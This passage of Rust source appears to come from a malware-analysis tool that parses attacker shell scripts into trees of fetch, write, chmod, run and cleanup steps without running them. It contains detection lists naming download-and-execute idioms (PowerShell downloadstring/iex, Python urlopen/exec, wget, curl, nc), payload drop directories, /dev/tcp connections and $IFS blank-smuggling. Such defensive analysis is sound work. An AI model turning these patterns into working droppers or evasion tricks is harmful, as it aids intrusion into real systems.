//! Shell recipes: a byte tokeniser and a reader that turn attacker shell
//! text into a tree of steps, branches kept. Nothing here is run, expanded
//! or fetched. Attackers feed this directly, so it is bounded and total: the
//! tokeniser is one pass over the bytes, groups live on an explicit stack,
//! and the tree's height is capped, which bounds the few recursive walks
//! (and the derived `Drop`) below.

use std::collections::VecDeque;
use std::mem::take;

use super::decode::{open, push_opaque};
use super::pieces::urls_in;
use super::{Budget, LayerKind, MAX_PIECES, OpaqueReason, Recipe, Span, Xray, key};

/// Longest token a step may keep, and the longest normal form: the piece
/// value limit.
const MAX_VALUE: usize = 512;

/// Open groups, and height of a recipe's tree. A chain of `||` nests one
/// level per link, so this is well above the depth of real scripts.
const MAX_NEST: usize = 32;

/// Longest command name `Step::Other` keeps, and longest part of a path
/// taken for a payload: a line of base64 is neither.
const MAX_NAME: usize = 32;

/// What `Step::Other` holds for a word that is no plain command name, so
/// neither file names nor stray data reach it.
const UNNAMED: &str = "<word>";

/// Shells, and other programs that run what they are given, with the flags
/// saying the code is an argument. The words of the second list also start
/// plain sentences, so they need a file or a pipe to count as a run.
const SHELLS: [&[u8]; 6] = [b"sh", b"bash", b"ash", b"dash", b"ksh", b"zsh"];
const INTERPRETERS: [(&[u8], &[u8]); 7] = [
    (b".", b""),
    (b"source", b""),
    (b"python", b"c"),
    (b"python2", b"c"),
    (b"python3", b"c"),
    (b"perl", b"eE"),
    (b"php", b"r"),
];

/// Directories whose programs are the system's, not a dropped payload.
const SYSTEM_DIRS: [&[u8]; 7] = [
    b"/bin/", b"/sbin/", b"/usr/", b"/etc/", b"/lib/", b"/proc/", b"/sys/",
];

/// Where a payload is dropped when its path has no `.` to show for itself.
const DROP_DIRS: [&[u8]; 8] = [
    b"/tmp/",
    b"/var/",
    b"/dev/shm/",
    b"/root/",
    b"/home/",
    b"/mnt/",
    b"/opt/",
    b"/run/",
];

/// Longest path taken for a payload.
const MAX_PATH: usize = 128;

/// Short options that take a value, per tool, as one byte each; then the
/// ones among them naming the local file.
const WGET_VALUES: (&[u8], &[u8]) = (b"aABDeIilOoPQRtTUwX", b"O");
const CURL_VALUES: (&[u8], &[u8]) = (b"AbcCdDeEFHKmoPQrtTuUwxXyYz", b"o");
const SCP_VALUES: (&[u8], &[u8]) = (b"cDFiJloPSX", b"");
const TFTP_VALUES: (&[u8], &[u8]) = (b"blcmr", b"lr");
const FTPGET_VALUES: (&[u8], &[u8]) = (b"uPp", b"");
const NC_VALUES: (&[u8], &[u8]) = (b"pwsiqxXOIe", b"");
const NO_VALUES: (&[u8], &[u8]) = (b"", b"");

/// What code for another language says, lowercased: first that it fetches,
/// then that it runs or saves what it fetched.
type CodeWords = (&'static [&'static str], &'static [&'static str]);
const PYTHON_CODE: CodeWords = (
    &["urllib", "requests", "urlopen", "http.client", "httplib"],
    &[
        "exec(",
        "eval(",
        "urlretrieve",
        ".write(",
        "os.system",
        "subprocess",
    ],
);
const PERL_CODE: CodeWords = (
    &["lwp", "http::tiny"],
    &["getstore", "mirror", "system", "eval", "open("],
);
const POWERSHELL_CODE: CodeWords = (
    &[
        "downloadstring",
        "downloadfile",
        "invoke-webrequest",
        "invoke-restmethod",
        "iwr ",
        "irm ",
    ],
    &["iex", "invoke-expression", "downloadfile", "-outfile"],
);

/// Long options of wget and curl that take the next word as their value.
const LONG_VALUES: [&[u8]; 19] = [
    b"user-agent",
    b"header",
    b"referer",
    b"tries",
    b"timeout",
    b"connect-timeout",
    b"max-time",
    b"data",
    b"data-raw",
    b"data-binary",
    b"data-urlencode",
    b"form",
    b"cookie",
    b"post-data",
    b"post-file",
    b"user",
    b"password",
    b"proxy",
    b"request",
];

/// One thing a recipe does. Spans point into the layer being read.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Step {
    /// Setting the stage, by command name: `cd`, `mkdir`, `chmod 600`.
    Prepare(String),
    /// A file written, with the data when it is literal in the text.
    Write(Option<Span>),
    /// `saves`: the result is piped to a shell, written to a file, or run
    /// later. Without it the URL was only queried.
    Fetch {
        tool: String,
        target: Span,
        saves: bool,
    },
    /// `what` is the file run, or the shell when it reads its input; `tag`
    /// is the last argument to the payload, the attacker's claim.
    Run { what: String, tag: Option<String> },
    /// `chmod` making a file executable.
    Arm,
    /// `rm` before anything was dropped.
    Wipe,
    /// `rm` after something was dropped, or `history`.
    Cleanup,
    /// Any other command, by name.
    Other(String),
}

/// A recipe's tree. `Try` is what `||` and `if … else` branch on: `first`
/// holds the attempt, `fallback` what runs otherwise (empty with no `else`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Node {
    Step(Step),
    Pipe(Vec<Node>),
    Try {
        first: Vec<Node>,
        fallback: Vec<Node>,
    },
}

/// One shell word: its range with quotes, its range without them when it is
/// one quoted run, and its text unquoted (expansions stay as written).
#[derive(Debug, Default)]
struct Word {
    start: usize,
    end: usize,
    inner: (usize, usize),
    text: Vec<u8>,
    quoted: bool,
    dynamic: bool,
    /// Ranges of the `$( )` and backticks inside, without their delimiters.
    subs: Vec<(usize, usize)>,
}

impl Word {
    fn span(&self, layer: usize) -> Span {
        Span {
            layer,
            start: self.inner.0,
            end: self.inner.1,
        }
    }

    fn url_like(&self) -> bool {
        self.dynamic || self.text.iter().any(|b| matches!(b, b'.' | b':' | b'/'))
    }

    /// The range inside, when the word is one substitution and nothing else.
    fn only_substitution(&self) -> Option<(usize, usize)> {
        let &[(start, end)] = self.subs.as_slice() else {
            return None;
        };
        let opener = match self.text.as_slice() {
            [b'$' | b'<', b'(', ..] => 2,
            [b'`', ..] => 1,
            _ => return None,
        };
        (self.text.len() <= opener + (end - start) + 1).then_some((start, end))
    }

    /// The range inside, when the word is `<(…)`, which reads as a file.
    fn process_substitution(&self) -> Option<(usize, usize)> {
        self.only_substitution()
            .filter(|_| self.text.starts_with(b"<("))
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Op {
    /// `;`, `&` or a newline.
    Sep,
    And,
    Or,
    Pipe,
    Open,
    Close,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Redir {
    /// Standard output to the next word.
    Out,
    /// Standard input from the next word, or with `string` being that word.
    Stdin { string: bool },
    /// A heredoc, with the next word as its end line.
    Here { strip_tabs: bool },
    /// Anything else; the next word is not an argument.
    Skip,
}

#[derive(Debug)]
enum Tok {
    Word(Word),
    Op(Op),
    Redir(Redir),
    End,
}

/// Pulls one token at a time, so a stopped reader leaves the rest unread.
/// Every byte is passed once, whatever the quoting, so a layer costs time
/// linear in its size.
struct Lexer<'a> {
    text: &'a [u8],
    at: usize,
    /// Substitutions passed since the reader last took them.
    subs: Vec<(usize, usize)>,
    /// The end line of a heredoc that starts at the next newline.
    heredoc: Option<(Vec<u8>, bool)>,
    /// The body of the last heredoc read.
    body: Option<(usize, usize)>,
    /// Behind `|`, `&&` or `||`: a newline does not end the command.
    joined: bool,
}

impl<'a> Lexer<'a> {
    fn new(text: &'a [u8]) -> Lexer<'a> {
        Lexer {
            text,
            at: 0,
            subs: Vec::new(),
            heredoc: None,
            body: None,
            joined: false,
        }
    }

    fn peek(&self, ahead: usize) -> Option<u8> {
        self.text.get(self.at + ahead).copied()
    }

    /// Blanks, line continuations and comments.
    fn skip_blanks(&mut self) {
        loop {
            match (self.peek(0), self.peek(1)) {
                (Some(b' ' | b'\t' | b'\r'), _) => self.at += 1,
                (Some(b'\\'), Some(b'\n')) => self.at += 2,
                (Some(b'#'), _) => {
                    let line = find(self.text, self.at, b'\n');
                    self.at = line;
                }
                (Some(b'$'), _) => match self.ifs_len() {
                    Some(len) => self.at += len,
                    None => return,
                },
                _ => return,
            }
        }
    }

    /// `$IFS` here, unquoted, is how payloads write a blank: its length, as
    /// `$IFS`, `${IFS}` or `${IFS%??}`, with the `$9` or `$()` that may
    /// follow it to end the name and expands to nothing.
    fn ifs_len(&self) -> Option<usize> {
        let rest = &self.text[self.at..];
        let len = if let Some(tail) = rest.strip_prefix(b"$IFS") {
            if tail
                .first()
                .is_some_and(|&b| b.is_ascii_alphanumeric() || b == b'_')
            {
                return None;
            }
            b"$IFS".len()
        } else {
            let tail = rest.strip_prefix(b"${IFS")?;
            if !matches!(tail.first(), Some(b'}' | b'%' | b'#' | b':' | b'/' | b'^')) {
                return None;
            }
            rest.iter().position(|&b| b == b'}')? + 1
        };
        Some(match &rest[len..] {
            [b'$', b'1'..=b'9', ..] => len + 2,
            [b'$', b'(', b')', ..] => len + 3,
            _ => len,
        })
    }

    fn next(&mut self) -> Tok {
        loop {
            self.skip_blanks();
            let Some(b) = self.peek(0) else {
                return Tok::End;
            };
            if b == b'\n' {
                self.at += 1;
                self.heredoc_body();
                if self.joined {
                    continue;
                }
                return Tok::Op(Op::Sep);
            }
            self.joined = false;
            let (len, tok) = match (b, self.peek(1)) {
                (b';', _) => (1, Tok::Op(Op::Sep)),
                (b'&', Some(b'&')) => (2, Tok::Op(Op::And)),
                (b'&', Some(b'>')) => {
                    self.at += 1;
                    return self.redirect(None);
                }
                (b'&', _) => (1, Tok::Op(Op::Sep)),
                (b'|', Some(b'|')) => (2, Tok::Op(Op::Or)),
                (b'|', Some(b'&')) => (2, Tok::Op(Op::Pipe)),
                (b'|', _) => (1, Tok::Op(Op::Pipe)),
                (b'(', _) => (1, Tok::Op(Op::Open)),
                (b')', _) => (1, Tok::Op(Op::Close)),
                (b'<', Some(b'(')) => return self.process_substitution(),
                (b'<' | b'>', _) => return self.redirect(None),
                _ => return self.word_or_fd(),
            };
            self.at += len;
            self.joined = matches!(tok, Tok::Op(Op::And | Op::Or | Op::Pipe));
            return tok;
        }
    }

    /// `<(…)`: a word of its own, opened like `$(…)`.
    fn process_substitution(&mut self) -> Tok {
        let start = self.at;
        let close = closing_paren(self.text, start + 2);
        self.subs.push((start + 2, close));
        self.at = (close + 1).min(self.text.len());
        Tok::Word(Word {
            start,
            end: self.at,
            inner: (start, self.at),
            text: self.text[start..self.at].to_vec(),
            dynamic: true,
            ..Word::default()
        })
    }

    fn word_or_fd(&mut self) -> Tok {
        let word = self.word();
        let fd = !word.quoted && !word.text.is_empty();
        let fd = fd && word.text.iter().all(u8::is_ascii_digit);
        if fd && matches!(self.peek(0), Some(b'<' | b'>')) {
            return self.redirect(Some(&word.text));
        }
        Tok::Word(word)
    }

    fn redirect(&mut self, fd: Option<&[u8]>) -> Tok {
        let (len, redir) = match &self.text[self.at..] {
            [b'<', b'<', b'<', ..] => (3, Redir::Stdin { string: true }),
            [b'<', b'<', b'-', ..] => (3, Redir::Here { strip_tabs: true }),
            [b'<', b'<', ..] => (2, Redir::Here { strip_tabs: false }),
            [b'<', b'&' | b'>', ..] | [b'>', b'&', ..] => (2, Redir::Skip),
            [b'<', ..] => (1, Redir::Stdin { string: false }),
            [b'>', b'>' | b'|', ..] => (2, Redir::Out),
            _ => (1, Redir::Out),
        };
        self.at += len;
        let own: &[u8] = if redir == Redir::Out { b"1" } else { b"0" };
        let elsewhere =
            matches!(redir, Redir::Out | Redir::Stdin { .. }) && fd.is_some_and(|fd| fd != own);
        Tok::Redir(if elsewhere { Redir::Skip } else { redir })
    }

    /// Past the newline of a pending heredoc: skip to its end line. With no
    /// end line, the rest of the text is the body.
    fn heredoc_body(&mut self) {
        let Some((end, strip_tabs)) = self.heredoc.take() else {
            return;
        };
        let start = self.at;
        let mut line = start;
        while line < self.text.len() {
            let stop = find(self.text, line, b'\n');
            let mut text = &self.text[line..stop];
            text = text.strip_suffix(b"\r").unwrap_or(text);
            if strip_tabs {
                let tabs = text.iter().take_while(|&&b| b == b'\t').count();
                text = &text[tabs..];
            }
            if text == end.as_slice() {
                self.body = Some((start, line));
                self.at = (stop + 1).min(self.text.len());
                return;
            }
            line = stop + 1;
        }
        self.body = Some((start, self.text.len()));
        self.at = self.text.len();
    }

    fn word(&mut self) -> Word {
        let mut word = Word {
            start: self.at,
            ..Word::default()
        };
        let mut runs = 0;
        let mut bare = false;
        let mut quoted_run = (0, 0);
        while let Some(b) = self.peek(0) {
            if matches!(
                b,
                b' ' | b'\t' | b'\r' | b'\n' | b';' | b'&' | b'|' | b'(' | b')' | b'<' | b'>'
            ) || (b == b'$' && self.ifs_len().is_some())
            {
                break;
            }
            match b {
                b'\'' | b'"' => {
                    let start = self.at + 1;
                    let end = if b == b'\'' {
                        self.single_quoted(&mut word)
                    } else {
                        self.double_quoted(&mut word)
                    };
                    word.quoted = true;
                    runs += 1;
                    quoted_run = (start, end);
                }
                b'\\' => {
                    word.quoted = true;
                    bare = true;
                    if let Some(next) = self.peek(1)
                        && next != b'\n'
                    {
                        word.text.push(next);
                    }
                    self.at = (self.at + 2).min(self.text.len());
                }
                b'$' => {
                    bare = true;
                    self.dollar(&mut word);
                }
                b'`' => {
                    bare = true;
                    self.backtick(&mut word);
                }
                _ => {
                    bare = true;
                    word.text.push(b);
                    self.at += 1;
                }
            }
        }
        word.end = self.at;
        word.inner = if runs == 1 && !bare {
            quoted_run
        } else {
            (word.start, word.end)
        };
        word
    }

    /// Returns where the quoted text ends.
    fn single_quoted(&mut self, word: &mut Word) -> usize {
        let start = self.at + 1;
        let end = find(self.text, start, b'\'');
        word.text.extend_from_slice(&self.text[start..end]);
        self.at = (end + 1).min(self.text.len());
        end
    }

    /// Returns where the quoted text ends.
    fn double_quoted(&mut self, word: &mut Word) -> usize {
        self.at += 1;
        while let Some(b) = self.peek(0) {
            match b {
                b'"' => {
                    self.at += 1;
                    return self.at - 1;
                }
                b'\\' => {
                    match self.peek(1) {
                        Some(next @ (b'"' | b'$' | b'`' | b'\\')) => word.text.push(next),
                        Some(b'\n') | None => {}
                        Some(next) => word.text.extend_from_slice(&[b, next]),
                    }
                    self.at = (self.at + 2).min(self.text.len());
                }
                b'$' => self.dollar(word),
                b'`' => self.backtick(word),
                _ => {
                    word.text.push(b);
                    self.at += 1;
                }
            }
        }
        self.at
    }

    /// `$(…)` and `` `…` `` are noted for the reader; `$((…))`, `${…}` and
    /// `$name` only make the word dynamic. All stay in its text as written.
    fn dollar(&mut self, word: &mut Word) {
        let start = self.at;
        let end = match self.peek(1) {
            Some(b'(') => {
                let close = closing_paren(self.text, start + 2);
                if self.peek(2) != Some(b'(') {
                    self.subs.push((start + 2, close));
                }
                close + 1
            }
            Some(b'{') => find(self.text, start, b'}') + 1,
            Some(b) if b.is_ascii_alphanumeric() || b"_?!@*#$-".contains(&b) => start + 1,
            _ => {
                word.text.push(b'$');
                self.at += 1;
                return;
            }
        };
        self.at = end.min(self.text.len());
        word.text.extend_from_slice(&self.text[start..self.at]);
        word.dynamic = true;
    }

    fn backtick(&mut self, word: &mut Word) {
        let start = self.at;
        let mut end = start + 1;
        while end < self.text.len() && self.text[end] != b'`' {
            end += if self.text[end] == b'\\' { 2 } else { 1 };
        }
        let end = end.min(self.text.len());
        self.subs.push((start + 1, end));
        self.at = (end + 1).min(self.text.len());
        word.text.extend_from_slice(&self.text[start..self.at]);
        word.dynamic = true;
    }
}

/// The first `b` at or after `from`, or the end of the text.
fn find(text: &[u8], from: usize, b: u8) -> usize {
    let tail = text.get(from..).unwrap_or_default();
    tail.iter()
        .position(|&c| c == b)
        .map_or(text.len(), |n| from + n)
}

/// The `)` matching a `(` just before `from`, or the end of the text.
/// Quotes hide parentheses; a `"` opened inside a nested `$(` inside a `"`
/// is misread, which only misplaces the end of a substitution.
fn closing_paren(text: &[u8], from: usize) -> usize {
    let mut depth = 1usize;
    let mut i = from;
    while i < text.len() {
        match text[i] {
            b'\\' => i += 1,
            b'\'' => i = find(text, i + 1, b'\''),
            b'"' => {
                i += 1;
                while i < text.len() && text[i] != b'"' {
                    i += if text[i] == b'\\' { 2 } else { 1 };
                }
            }
            b'(' => depth += 1,
            b')' => {
                depth -= 1;
                if depth == 0 {
                    return i;
                }
            }
            _ => {}
        }
        i += 1;
    }
    text.len()
}

/// The part after the last `/`.
fn base(path: &[u8]) -> &[u8] {
    path.rsplit(|&b| b == b'/').next().unwrap_or(path)
}

/// The file a URL or `scp` source is saved as by default.
fn url_name(url: &[u8]) -> &[u8] {
    let path = url.split(|&b| b == b'?' || b == b'#').next().unwrap_or(url);
    let path = path.strip_suffix(b"/").unwrap_or(path);
    path.rsplit(|&b| b == b'/' || b == b':')
        .next()
        .unwrap_or(path)
}

fn is_file(path: &[u8]) -> bool {
    !matches!(path, b"-" | b"/dev/null" | b"/dev/stdout")
}

fn is_assignment(word: &Word) -> bool {
    let name = word.text.iter().take_while(|&&b| b != b'=').count();
    name > 0
        && name < word.text.len()
        && !word.text[0].is_ascii_digit()
        && word.text[..name]
            .iter()
            .all(|&b| b.is_ascii_alphanumeric() || b == b'_')
}

/// A path a payload could be at; `/usr/bin/id` is the system's. A line of
/// base64 starts with `/` often enough, so a path has to look like one: a
/// `.` or a directory payloads are dropped in, and no base64 padding or `+`.
fn is_payload_path(path: &[u8]) -> bool {
    let relative: [&[u8]; 4] = [b"/", b"./", b"../", b"~/"];
    let path_bytes = |b: &u8| b.is_ascii_alphanumeric() || b"._~/-".contains(b);
    relative.iter().any(|p| path.starts_with(p))
        && !SYSTEM_DIRS.iter().any(|dir| path.starts_with(dir))
        && path.len() <= MAX_PATH
        && path.iter().all(path_bytes)
        && (path.contains(&b'.') || DROP_DIRS.iter().any(|dir| path.starts_with(dir)))
        && path.split(|&b| b == b'/').all(|p| p.len() <= MAX_NAME)
}

/// `chmod` modes that set an execute bit.
fn is_exec_mode(mode: &[u8]) -> bool {
    if mode.first().is_some_and(u8::is_ascii_digit) {
        return mode.iter().any(|b| matches!(b, b'1' | b'3' | b'5' | b'7'));
    }
    let set = mode.iter().position(|b| matches!(b, b'+' | b'='));
    set.is_some_and(|at| mode[at..].contains(&b'x'))
}

fn plain_name(name: &[u8]) -> String {
    let plain = name
        .iter()
        .all(|&b| b.is_ascii_alphanumeric() || b == b'_' || b == b'-')
        && !name.iter().all(u8::is_ascii_digit);
    if plain && !name.is_empty() && name.len() <= MAX_NAME {
        String::from_utf8_lossy(name).into_owned()
    } else {
        UNNAMED.to_string()
    }
}

/// Assignments and wrappers in front of the real command. True in the
/// second place when only assignments were there.
fn unwrap_command(mut words: &[Word]) -> (&[Word], bool) {
    let assigns = words.iter().take_while(|w| is_assignment(w)).count();
    words = &words[assigns..];
    if words.is_empty() {
        return (words, assigns > 0);
    }
    while let [first, rest @ ..] = words {
        let name = base(&first.text);
        let wrapper = matches!(
            name,
            b"busybox"
                | b"nohup"
                | b"exec"
                | b"sudo"
                | b"setsid"
                | b"nice"
                | b"timeout"
                | b"env"
                | b"time"
                | b"builtin"
        );
        let plain_command =
            name == b"command" && !rest.first().is_some_and(|w| w.text.starts_with(b"-"));
        if !wrapper && !plain_command {
            break;
        }
        let numbers = matches!(name, b"nice" | b"timeout");
        let own = rest
            .iter()
            .take_while(|w| {
                w.text.starts_with(b"-")
                    || is_assignment(w)
                    || (numbers && w.text.first().is_some_and(u8::is_ascii_digit))
            })
            .count();
        words = &rest[own..];
    }
    (words, false)
}

/// What a fetch tool's arguments say.
#[derive(Default)]
struct FetchArgs<'w> {
    positional: Vec<&'w Word>,
    output: Option<&'w [u8]>,
    remote_name: bool,
    spider: bool,
}

fn fetch_args<'w>(args: &'w [Word], (values, outputs): (&[u8], &[u8])) -> FetchArgs<'w> {
    let mut found = FetchArgs::default();
    let mut rest = args.iter();
    while let Some(word) = rest.next() {
        let text = word.text.as_slice();
        if text == b"--" {
            found.positional.extend(rest);
            break;
        }
        if let Some(long) = text.strip_prefix(b"--") {
            let eq = long.iter().position(|&b| b == b'=');
            let name = eq.map_or(long, |at| &long[..at]);
            let inline = eq.map(|at| &long[at + 1..]);
            match name {
                b"output-document" | b"output" => {
                    found.output = inline.or_else(|| rest.next().map(|w| w.text.as_slice()));
                }
                b"remote-name" => found.remote_name = true,
                b"spider" => found.spider = true,
                _ if inline.is_none() && LONG_VALUES.contains(&name) => {
                    rest.next();
                }
                _ => {}
            }
        } else if text.len() > 1 && text[0] == b'-' {
            for (i, &flag) in text.iter().enumerate().skip(1) {
                if values.contains(&flag) {
                    let value = match &text[i + 1..] {
                        [] => rest.next().map(|w| w.text.as_slice()),
                        value => Some(value),
                    };
                    if outputs.contains(&flag) {
                        found.output = value;
                    }
                    break;
                }
                found.remote_name |= flag == b'O';
            }
        } else {
            found.positional.push(word);
        }
    }
    found
}

/// Nodes and how high their tree is, so the height is known without a walk.
#[derive(Debug, Default)]
struct List {
    nodes: Vec<Node>,
    height: usize,
}

impl List {
    fn push(&mut self, node: Node, height: usize) {
        self.nodes.push(node);
        self.height = self.height.max(height);
    }

    fn append(&mut self, mut other: List) {
        self.nodes.append(&mut other.nodes);
        self.height = self.height.max(other.height);
    }

    fn branch(first: List, fallback: List) -> List {
        let mut list = List::default();
        if !first.nodes.is_empty() || !fallback.nodes.is_empty() {
            let height = first.height.max(fallback.height) + 1;
            let node = Node::Try {
                first: first.nodes,
                fallback: fallback.nodes,
            };
            list.push(node, height);
        }
        list
    }

    /// `left || right`; with one side missing there is nothing to choose.
    fn either(left: List, right: List) -> List {
        match (left.nodes.is_empty(), right.nodes.is_empty()) {
            (true, _) => right,
            (_, true) => left,
            _ => List::branch(left, right),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Arm {
    Cond,
    Then,
    Else,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Kind {
    Root,
    Group,
    /// `status`: the condition tests `$?` for success. `chained`: an `elif`,
    /// closed by the `fi` of the `if` above.
    If {
        arm: Arm,
        status: bool,
        chained: bool,
    },
}

/// One open group. The current command ends in `stages`, the pipeline in
/// `cur`, the and-or list in `list`.
#[derive(Debug)]
struct Frame {
    kind: Kind,
    /// The finished part of the current arm.
    list: List,
    /// The left side of an open `||`.
    left: Option<List>,
    cur: List,
    stages: List,
    /// A `|` was passed in this pipeline.
    piped: bool,
    /// Where this pipeline starts.
    pipe_start: Mark,
    /// An `if`'s condition and `then` arm.
    first: List,
}

impl Frame {
    fn new(kind: Kind, pipe_start: Mark) -> Frame {
        Frame {
            kind,
            list: List::default(),
            left: None,
            cur: List::default(),
            stages: List::default(),
            piped: false,
            pipe_start,
            first: List::default(),
        }
    }

    fn height(&self) -> usize {
        let left = self.left.as_ref().map_or(0, |l| l.height);
        self.list
            .height
            .max(left)
            .max(self.cur.height)
            .max(self.stages.height)
            .max(self.first.height)
    }

    fn end_pipeline(&mut self, mark: Mark) {
        let stages = take(&mut self.stages);
        if stages.nodes.len() > 1 {
            self.cur.push(Node::Pipe(stages.nodes), stages.height + 1);
        } else {
            self.cur.append(stages);
        }
        self.piped = false;
        self.pipe_start = mark;
    }

    fn end_or(&mut self) {
        if let Some(left) = self.left.take() {
            self.cur = List::either(left, take(&mut self.cur));
        }
    }

    fn end_list(&mut self, mark: Mark) {
        self.end_pipeline(mark);
        self.end_or();
        let cur = take(&mut self.cur);
        self.list.append(cur);
    }

    fn or(&mut self, mark: Mark) {
        self.end_pipeline(mark);
        self.end_or();
        if !self.cur.nodes.is_empty() {
            self.left = Some(take(&mut self.cur));
        }
    }
}

/// How much of `Reader::files` and `Reader::fed` came before a pipeline.
#[derive(Debug, Clone, Copy, Default)]
struct Mark {
    files: usize,
    fed: usize,
}

/// A file a step put on disk, and the fetch behind it if there is one.
#[derive(Debug)]
struct File {
    target: Option<usize>,
    name: Option<Vec<u8>>,
    saved: bool,
}

#[derive(Debug, Default)]
struct Command {
    words: Vec<Word>,
    out: Option<Word>,
    /// The word on standard input, and whether it is that input itself.
    stdin: Option<(Word, bool)>,
    body: Option<(usize, usize)>,
}

struct Reader<'a> {
    xray: &'a mut Xray,
    budget: &'a mut Budget,
    queue: &'a mut VecDeque<usize>,
    /// Layers whose output is run as code.
    run_output: &'a mut Vec<usize>,
    layer: usize,
    text: &'a [u8],
    /// Where in `text` a key sits.
    mask: Vec<(usize, usize)>,
    lex: Lexer<'a>,
    root: Frame,
    frames: Vec<Frame>,
    cmd: Command,
    redir: Option<Redir>,
    files: Vec<File>,
    /// Substitutions in what `echo`, `printf` and `cat` print.
    fed: Vec<(usize, usize)>,
    stopped: bool,
    /// A substitution was refused.
    sealed: bool,
    /// A shell reads the heredoc whose body comes next.
    heredoc_runs: bool,
}

impl Reader<'_> {
    fn top(&mut self) -> &mut Frame {
        self.frames.last_mut().unwrap_or(&mut self.root)
    }

    fn mark(&self) -> Mark {
        Mark {
            files: self.files.len(),
            fed: self.fed.len(),
        }
    }

    /// Stop here, and say why.
    fn over(&mut self, reason: OpaqueReason) {
        if !self.stopped {
            self.stopped = true;
            let at = Span {
                layer: self.layer,
                start: self.lex.at,
                end: self.text.len(),
            };
            push_opaque(self.xray, at, reason);
        }
    }

    fn run(&mut self) -> List {
        while !self.stopped {
            let mut tok = self.lex.next();
            let subs = take(&mut self.lex.subs);
            self.open_substitutions(&subs);
            if let Tok::Word(word) = &mut tok {
                word.subs = subs;
            }
            match tok {
                Tok::End => {
                    self.end_command();
                    break;
                }
                Tok::Word(word) => self.word(word),
                Tok::Redir(redir) => self.redir = Some(redir),
                Tok::Op(op) => self.op(op),
            }
            if self.top().height() > MAX_NEST {
                self.over(OpaqueReason::TooDeep);
            }
        }
        while let Some(frame) = self.frames.pop() {
            self.close(frame);
        }
        let mark = self.mark();
        self.root.end_list(mark);
        take(&mut self.root.list)
    }

    fn open_substitutions(&mut self, subs: &[(usize, usize)]) {
        for &(start, end) in subs {
            let at = Span {
                layer: self.layer,
                start,
                end,
            };
            self.open_shell(at, self.text[start..end].to_vec());
        }
    }

    /// Open a `Shell` child. The first refusal is the only one noted: the
    /// rest of this layer stays closed.
    fn open_shell(&mut self, at: Span, text: Vec<u8>) {
        if self.sealed || text.iter().all(u8::is_ascii_whitespace) {
            return;
        }
        let (kind, parent) = (LayerKind::Shell, self.layer);
        let noted = self.xray.opaque.len();
        open(self.xray, parent, kind, at, text, self.budget, self.queue);
        self.sealed = self.xray.opaque.len() > noted;
    }

    /// `words` are code a shell runs. One substitution alone needs no layer
    /// of its own: what it prints is the code.
    fn open_script(&mut self, words: &[Word]) {
        match words {
            [] => {}
            [word] => match word.only_substitution() {
                Some(sub) => self.output_is_run(sub),
                None => self.open_shell(word.span(self.layer), word.text.clone()),
            },
            [first, .., last] => {
                let at = Span {
                    layer: self.layer,
                    start: first.start,
                    end: last.end,
                };
                let parts: Vec<&[u8]> = words.iter().map(|w| w.text.as_slice()).collect();
                self.open_shell(at, parts.join(&b' '));
            }
        }
    }

    /// The substitution may have been refused, or be open already under
    /// another parent, so it is found by its text.
    fn output_is_run(&mut self, (start, end): (usize, usize)) {
        let text = &self.text[start..end];
        let layer = self.xray.layers.iter().position(|l| l.text == text);
        if !text.is_empty()
            && let Some(layer) = layer
            && !self.run_output.contains(&layer)
        {
            self.run_output.push(layer);
        }
    }

    /// The word, or one of its characters, is part of a private key.
    fn masked(&self, word: &Word) -> bool {
        self.mask
            .iter()
            .any(|&(start, end)| word.start < end && start < word.end)
    }

    /// `/dev/tcp/<host>/<port>`: a fetch by the shell itself, wherever the
    /// word stands. Saved only by what the pipeline does with it.
    fn dev_tcp(&mut self, word: &Word) {
        if !word.text.starts_with(b"/dev/tcp/") && !word.text.starts_with(b"/dev/udp/") {
            return;
        }
        let in_text = &self.text[word.start..word.end];
        let Some(at) = in_text.iter().position(|&b| b == b'/') else {
            return;
        };
        let start = word.start + at + b"/dev/tcp/".len();
        let end = self.text[start.min(word.end)..word.end]
            .iter()
            .position(|&b| matches!(b, b'/' | b'"' | b'\''))
            .map_or(word.end, |p| start + p);
        if start >= end {
            return;
        }
        let target = Span {
            layer: self.layer,
            start,
            end,
        };
        self.emit(Step::Fetch {
            tool: "tcp".to_string(),
            target,
            saves: false,
        });
        self.files.push(File {
            target: Some(start),
            name: None,
            saved: false,
        });
    }

    fn word(&mut self, word: Word) {
        self.dev_tcp(&word);
        match self.redir.take() {
            Some(Redir::Out) if is_file(&word.text) => self.cmd.out = Some(word),
            Some(Redir::Stdin { string }) => self.cmd.stdin = Some((word, string)),
            Some(Redir::Here { strip_tabs }) => self.lex.heredoc = Some((word.text, strip_tabs)),
            Some(_) => {}
            None => {
                if self.cmd.words.is_empty() && !word.quoted && !word.dynamic {
                    if self.keyword(&word.text) {
                        return;
                    }
                    // A pasted PEM block is no shell, and its lines must
                    // not turn into steps.
                    if word.text.starts_with(b"-----BEGIN") {
                        self.stopped = true;
                        return;
                    }
                }
                if self.cmd.words.len() >= MAX_PIECES {
                    return self.over(OpaqueReason::OverLimit);
                }
                self.cmd.words.push(word);
            }
        }
    }

    fn keyword(&mut self, word: &[u8]) -> bool {
        let mark = self.mark();
        match word {
            b"if" => self.open_frame(Kind::If {
                arm: Arm::Cond,
                status: false,
                chained: false,
            }),
            b"then" => {
                let top = self.top();
                if let Kind::If { arm, .. } = &mut top.kind
                    && *arm == Arm::Cond
                {
                    *arm = Arm::Then;
                    top.end_list(mark);
                    top.first = take(&mut top.list);
                }
            }
            b"elif" => {
                self.to_else();
                self.open_frame(Kind::If {
                    arm: Arm::Cond,
                    status: false,
                    chained: true,
                });
            }
            b"else" => self.to_else(),
            b"fi" => {
                while let Some(Frame {
                    kind: Kind::If { chained, .. },
                    ..
                }) = self.frames.last()
                {
                    let chained = *chained;
                    if let Some(frame) = self.frames.pop() {
                        self.close(frame);
                    }
                    if !chained {
                        break;
                    }
                }
            }
            b"{" => self.open_frame(Kind::Group),
            b"}" => self.close_group(),
            b"do" | b"done" | b"!" | b"while" | b"until" => {}
            _ => return false,
        }
        true
    }

    fn to_else(&mut self) {
        let mark = self.mark();
        let top = self.top();
        if let Kind::If { arm, .. } = &mut top.kind
            && *arm != Arm::Else
        {
            *arm = Arm::Else;
            top.end_list(mark);
            let then = take(&mut top.list);
            top.first.append(then);
        }
    }

